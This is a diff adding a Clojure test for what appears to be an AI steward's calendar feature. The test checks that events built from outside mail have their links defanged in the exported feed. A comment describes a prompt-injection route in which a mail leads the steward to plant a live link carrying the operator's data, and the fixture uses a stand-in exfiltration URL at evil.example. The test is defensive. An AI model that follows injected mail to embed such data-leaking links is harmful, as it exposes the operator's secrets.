@@ -373,3 +373,23 @@
     (is (<= (core/calendar-listed-count (:state w) (:now w)) core/calendar-limit))
     (is (<= (count (feed w)) core/calendar-limit))
     (is (empty? (feed w)) "they had left the feed already, so removing them lists nothing")))
+
+(deftest an-event-shaped-by-outside-text-has-its-links-broken-in-the-feed
+  ;; Codex R1: a mail could have the steward put a live link holding the
+  ;; operator's data in the calendar she subscribes to.
+  (let [w (advance (seed) 60)
+        link "https://evil.example/collect?data=SECRET"
+        add (fn [w labels title]
+              (first (core/run-command (:state w) {:type :calendar/add :actor "clerk" :labels labels
+                                                   :args (assoc dentist :title title :description (str "See " link))
+                                                   :session-wake (:id (relay.test-support/calling-wake (:state w) "clerk"))}
+                                       {:now (:now w) :config ct/cfg})))
+        state (add w ["contaminated" "mail:dana@riverbend.test" "private"] "From a mail")
+        state (add (assoc w :state state) ["private"] "From the operator")
+        by-title (into {} (map (juxt :title identity)
+                               (ics-test/read-events (ics/render {:now (:now w) :events (core/calendar-feed state)}))))]
+    (is (= ["contaminated" "mail:dana@riverbend.test" "private"]
+           (:labels (first (filter #(= "From a mail" (:title %)) (core/calendar-feed state)))))
+        "the feed carries each event's labels")
+    (is (= "See hxxps://evil[.]example/collect?data=SECRET" (:description (by-title "From a mail"))))
+    (is (= (str "See " link) (:description (by-title "From the operator"))))))
